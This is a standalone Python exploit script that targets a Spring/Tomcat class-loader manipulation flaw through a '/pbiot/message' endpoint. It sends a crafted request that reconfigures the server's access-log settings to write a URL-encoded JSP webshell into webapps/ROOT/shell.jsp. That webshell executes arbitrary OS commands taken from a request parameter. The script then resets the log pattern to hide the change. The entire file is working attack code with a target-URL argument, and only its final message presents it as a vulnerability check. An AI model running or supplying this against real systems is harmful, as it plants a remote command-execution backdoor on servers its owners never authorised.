import requests
import time
import argparse

# URL-encoded content of JSP containing a simple webshell
JSP_CONTENT = '%25%7Bprefix%7Di%40%20page%20import%3D%22java.util.%2A%2Cjava.io.%2A%22%25%7Bsuffix%7Di%0A%3CHTML%3E%3CBODY%3E%0A%3CFORM%20METHOD%3D%22GET%22%20NAME%3D%22myform%22%20ACTION%3D%22%22%3E%0A%3CINPUT%20TYPE%3D%22text%22%20NAME%3D%22cmd%22%3E%0A%3CINPUT%20TYPE%3D%22submit%22%20VALUE%3D%22Send%22%3E%0A%3C%2FFORM%3E%0A%3Cpre%3E%0A%25%7Bprefix%7Di%0Aif%20%28request.getParameter%28%22cmd%22%29%20%21%3D%20null%29%20%7B%0A%20%20%20%20%20%20%20%20out.println%28%22Command%3A%20%22%20%2B%20request.getParameter%28%22cmd%22%29%20%2B%20%22%3CBR%3E%22%29%3B%0A%20%20%20%20%20%20%20%20Process%20p%20%3D%25%7Bc%7Di.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B%0A%20%20%20%20%20%20%20%20OutputStream%20os%20%3D%20p.getOutputStream%28%29%3B%0A%20%20%20%20%20%20%20%20InputStream%20in%20%3D%20p.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20DataInputStream%20dis%20%3D%20new%20DataInputStream%28in%29%3B%0A%20%20%20%20%20%20%20%20String%20disr%20%3D%20dis.readLine%28%29%3B%0A%20%20%20%20%20%20%20%20while%20%28%20disr%20%21%3D%20null%20%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20out.println%28disr%29%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20disr%20%3D%20dis.readLine%28%29%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%25%7Bsuffix%7Di%0A%3C%2Fpre%3E%0A%3C%2FBODY%3E%3C%2FHTML%3E'

# Setting pattern variable during deserialization
CREATE_JSP = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern={JSP_CONTENT}"
SET_LOG_FILE_PREFIX = "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell"
SET_LOG_FILE_SUFFIX = "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
SET_LOG_FILE_DIR = "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
SET_FILE_DATE_FORMAT = "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

PAYLOAD = f"{CREATE_JSP}{SET_LOG_FILE_PREFIX}{SET_LOG_FILE_SUFFIX}{SET_LOG_FILE_DIR}{SET_FILE_DATE_FORMAT}"

HEADERS = {
    "prefix": "<%",
    "suffix": "%>",
    "c": "Runtime"
}

def exploit(url):
    try:
        # Sending payload
        print("[*] Sending payload...")
        response = requests.post(f"{url}/pbiot/message", headers=HEADERS, data=PAYLOAD)
        if response.status_code == 200:
            print("[+] Payload sent successfully.")
        else:
            print(f"[-] Failed to send payload. Status code: {response.status_code}")
            return False

        # Wait for the server to process the payload
        print("[*] Sleeping for 5 seconds...")
        time.sleep(5)

        # Clearing the pattern
        print("[*] Clearing pattern...")
        CLEAR_DATA = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
        response = requests.post(f"{url}/pbiot/message", data=CLEAR_DATA)
        if response.status_code == 200:
            print("[+] Pattern cleared successfully.")
            return True
        else:
            print(f"[-] Failed to clear pattern. Status code: {response.status_code}")
            return False

    except Exception as e:
        print(f"[-] Exploit failed with error: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Apache Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., 'http://localhost:8080')")
    args = parser.parse_args()

    if exploit(args.url):
        print("Detected Vulnerability : True")
    else:
        print("Detected Vulnerability : False")
